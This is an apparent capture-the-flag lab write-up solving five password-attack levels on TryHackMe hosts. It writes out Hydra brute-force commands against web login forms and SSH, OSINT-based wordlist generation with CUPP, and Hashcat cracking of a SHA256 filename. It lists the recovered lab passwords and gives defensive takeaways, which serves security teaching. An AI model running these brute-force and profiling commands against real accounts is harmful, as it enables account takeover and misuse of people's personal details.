![[Pasted image 20260530144541.png]]

![[Pasted image 20260530144548.png]]

#### What is the password for Level 1?

![[Pasted image 20260530144632.png]]

```
hydra -l admin \
-P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt \
firewall.thm -s 5001 \
http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid credentials."
```

![[Pasted image 20260530144752.png]]

Result:
```
12345
```
#### What is the password for Level 2?

![[Pasted image 20260530150225.png]]

![[Pasted image 20260530145133.png]]

Then go to `Employee Login` at the top-right-corner of the page:

![[Pasted image 20260530150344.png]]

THM mentioned Marco built an internal Employee Login panel on jobs.thm:5002 and used common company keywords as passwords, So we take a look at jobs.thm:5002 and use Hydra with a custom keyword list from the page.

Create:

```
cat > company.txt <<EOF
innovation
excellence
security
digital
cloud
future
talent
security123
innovation123
cloud123
digital123
future2025
EOF
```

Then:

```
hydra -l marco -P company.txt jobs.thm -s 5002 \
http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid Credemtials"
```

![[Pasted image 20260530151102.png]]

#### What is the password for Level 3?

![[Pasted image 20260530151342.png]]

![[Pasted image 20260530151602.png]]

The challenge hint suggested deriving Marco’s password using personal information from `jobs.thm:5002`. 

![[Pasted image 20260530151801.png]]

After checking the employee profile using credentials from Level 2 task, the following details were identified:

- First Name: Marco
- Surname: Bianchi
- Nickname: marky
- Birthdate: 14021995

Initial attempts involved manually testing common password patterns such as combinations of the nickname, surname, and birth year (e.g., `marky1995!`, `Marco140295`). However, these attempts were unsuccessful.

To automate password generation based on personal information, the `CUPP` (Common User Passwords Profiler) tool was used. The collected details were supplied to CUPP in order to generate a targeted wordlist containing realistic password combinations.

```
python3 cupp.py -i
```

![[Pasted image 20260530165751.png|1058]]

Just press Enter for all unknown fields like 
- partner
- child
- pet
- company

![[Pasted image 20260530170012.png|678]]

Wait few minutes for it to be generated and the wordlist was then used with Hydra to brute-force the login form on `social.thm:5003`.

```bash
hydra -l marco -P marco.txt social.thm -s 5003 http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials"
```

![[Pasted image 20260530164155.png]]

The attack successfully identified the valid credentials:

- Username: `marco`
    
- Password: `Bianchi2495`

One important observation was that the username was case-sensitive and required `marco` instead of `Marco`.

![[Pasted image 20260530164011.png]]
#### What is the password for Level 4?

![[Pasted image 20260530164705.png]]

The challenge description stated that uploaded files were automatically renamed using the SHA256 hash of the original filename and stored as `(SHA256).png`.

After logging into `social.thm:5003` using Marco’s credentials, the profile page was inspected. Inspecting the `<img>` tag for Marco’s avatar revealed the following hashed filename:

![[Pasted image 20260530173212.png]]

```text
d34a569ab7aaa54dacd715ae64953455d86b768846cd0085ef4e9e7471489b7b.png
```

The hash value identified as SHA256. A dictionary attack was then performed using Hashcat with SHA256 mode (`-m 1400`) and the `rockyou.txt` wordlist.

```bash
hashcat -m 1400 level4_hash.txt /usr/share/wordlists/rockyou.txt
```

![[Pasted image 20260530173558.png]]

Successfully cracked the hash and recovered the original filename:

```text
family
```

#### What is the password for Level 5?

![[Pasted image 20260530173656.png]]

 Marco’s social profile revealed a post describing his password pattern:

![[Pasted image 20260530205243.png]]

Marco is referring to THIS pattern: `Capitalize CompanyKeyword + Number/Year + !`

![[Pasted image 20260530205311.png|649]]

The visible company keywords on the post were:

- `security`
- `excellence`
- `innovation`
- `digital`
- `cloud`
- `future`
- `talent`

Based on this pattern, a small targeted wordlist was created using the keywords with the year 2024 and an exclamation mark. If 

```
cat > ssh_wordlist.txt << EOF
Security2024!
Excellence2024!
Innovation2024!
Digital2024!
Cloud2024!
Talent2024!
Future2024!
EOF
```

The SSH service was then brute-forced using Hydra with the username `marco`.

```
hydra -l marco -P ssh_wordlist.txt ssh://social.thm
```

![[Pasted image 20260530210556.png]]

The valid SSH password was found to be:

```
Security2024!
```

This credential was confirmed by successfully logging in through SSH as Marco:

```
ssh marco@social.thm
>>>> password: Security2024!
```

### Key Takeaways / Lessons Learned

- Personal information can be used to generate targeted password wordlists.
    
- Weak password patterns based on names, dates, and common keywords are highly predictable.
    
- `CUPP` can automate OSINT-based password generation using victim details.
    
- Hydra can brute-force web login forms and SSH services using targeted wordlists.
    
- Login forms may be case-sensitive (`marco` vs `Marco`).
    
- Browser developer tools can reveal hidden resources such as uploaded file paths and hashed filenames.
    
- Uploaded files renamed with hashes may still leak information if predictable filenames are used.
    
- Small targeted wordlists are often more effective than huge random brute-force attempts.
    
- Real-world password habits reused across services can lead to credential compromise.

